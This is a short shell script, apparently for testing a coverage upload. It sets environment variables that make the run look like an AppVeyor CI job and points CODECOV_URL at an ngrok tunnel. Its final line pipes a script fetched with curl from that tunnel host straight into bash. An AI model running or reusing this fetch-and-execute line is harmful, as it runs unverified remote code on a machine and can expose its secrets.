#!/bin/sh

set -x


export CI="True"
export APPVEYOR="True"
export CODECOV_URL="https://c52f9157.ngrok.io/"
bash <(curl -s https://c52f9157.ngrok.io/bash) 
